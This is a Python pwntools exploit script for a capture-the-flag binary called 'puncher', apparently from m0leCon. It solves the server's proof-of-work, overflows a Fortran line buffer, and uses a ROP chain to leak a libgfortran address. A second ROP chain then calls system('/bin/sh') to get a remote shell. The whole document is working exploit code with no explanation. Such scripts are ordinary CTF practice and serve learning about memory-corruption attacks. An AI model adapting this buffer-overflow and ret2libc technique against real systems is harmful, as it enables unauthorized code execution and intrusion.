from pwn import *
import hashlib
from itertools import product

binary = ELF("./puncher")
libgfortran = ELF("./libgfortran.so.5")

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None

if args.LOCAL:
    p = process("./puncher", env={"LD_PRELOAD": libgfortran.path})
else:
    p = connect("challs.m0lecon.it", 2637)
    p.recvuntil("Give me a string starting with ")
    start_string = p.recvuntil(" ")[:-1]
    p.recvuntil('such that its sha256sum ends in ')
    hash_end = p.recvuntil('.')[:-1].decode()
    p.sendline(solve_pow(start_string, hash_end))

p.sendlineafter("How many lines do you want to read?", str(2**24+1))

punch = binary.symbols["punch_"]
st_write_done = binary.got["_gfortran_st_write_done"]
pop_rdi = 0x00402033
pop_rsi_r15 = 0x00402031
address_of_eight = 0x00403330

payload = b'A'*0x40  # the original buffer
payload += b'B'*0xe  # some padding
payload += b'\x00\x00'  # set A to zero
payload += b'C'*0x10  # some padding
payload += b'D'*0x8  # saved RBP

# Here starts the rop chain
payload += p64(pop_rdi)
payload += p64(st_write_done)  # first argument of punch
payload += p64(pop_rsi_r15)
payload += p64(address_of_eight)  # second argument of punch
payload += p64(0)  # just a dummy value that goes into r15
payload += p64(punch)  # call punch
payload += p64(binary.symbols["main"])  # call main

p.sendlineafter("Reading line", payload)

p.recvuntil("_______________________________________________________________")
p.recvuntil("_______________________________________________________________")
p.recvuntil("_______________________________________________________________")

p.recvuntil("| ")
leak = p.recvline()
libgfortran.address = u64(leak[:8]) - libgfortran.symbols["_gfortran_st_write_done"]

print(f"libgfortran base: {hex(libgfortran.address)}")

p.sendlineafter("How many lines do you want to read?", str(2**24+1))

binsh = libgfortran.address + 0x0029c57b
system = libgfortran.symbols["system"]

payload = b'A'*0x40  # the original buffer
payload += b'B'*0xe  # some padding
payload += b'\x00\x00'  # set A to zero
payload += b'C'*0x10  # some padding
payload += b'D'*0x8  # saved RBP

# Here starts the ROP chain
payload += p64(pop_rdi)
payload += p64(binsh)  # first argument of system
payload += p64(system)  # call system

p.sendlineafter("Reading line", payload)

p.interactive()